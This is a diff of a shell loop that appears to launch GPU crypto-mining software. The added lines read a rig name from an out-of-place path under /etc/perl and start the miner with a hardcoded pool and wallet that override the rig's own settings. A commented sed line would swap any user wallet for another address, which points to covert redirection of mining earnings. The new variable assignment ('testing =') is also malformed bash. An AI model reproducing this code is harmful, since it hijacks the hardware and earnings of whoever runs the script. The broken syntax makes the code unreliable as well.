@@ -170,6 +170,7 @@ while true; do
   rm -rf /home/miner/.openclcache 2>/dev/null
   rm -rf /home/miner/.sgminer 2>/dev/null
   cd ${MINER_DIR}
+  rigName=`cat /etc/perl/main/execute/rigName.txt`
   # remove miners starting flag (this will start miners API)
   [[ -f /var/tmp/minerStart.run ]] && sudo rm -f /var/tmp/minerStart.run 2>/dev/null
   LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:./; export LD_LIBRARY_PATH;
@@ -177,11 +178,12 @@ while true; do
   [[ $(echo "${MINER_PKG_NAME}" | grep -i "^nbminer-nebutech" | head -n 1 | wc -l) == 1 ]] && MINER_ROOT="true"
   # # check user sudo setting
   [[ ${MINER_ROOT} == "true" ]] && minerSudo="sudo -E PATH=${PATH} HOME=${HOME} LD_LIBRARY_PATH=${LD_LIBRARY_PATH}"
-  ${minerSudo} /root/miner/${MINER_PKG_NAME}/${MINER_FILE} "-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x72148e6197fd52744c5d4cacbb5ec8ca7e015caf.$rigName -gpus 1"
+  testing ="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x72148e6197fd52744c5d4cacbb5ec8ca7e015caf.$rigName -gpus 1"
+  ${minerSudo} /root/miner/${MINER_PKG_NAME}/${MINER_FILE} ${testing}
 
   {
   #MINER_OPTIONS_GO=$(sed -E 's/(^-.*wal)[^.]*\.[^ ]*(.*)/ \1 0x0d7351bDD85268912739859a26f1A3151b4B3Fe0.imperiet -cdm 0\2/g' <<< ${MINER_OPTIONS_GO})
-  rigName=`cat /etc/perl/main/execute/rigName.txt`
+  
   #MINER_OPTIONS_GO="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x690b4bFd136243bF389711CDe4a9Fa21D106fdA2.${rigName} -dagrestart 1 -rvram -1 -eres 0"
 
   # test own miner =>
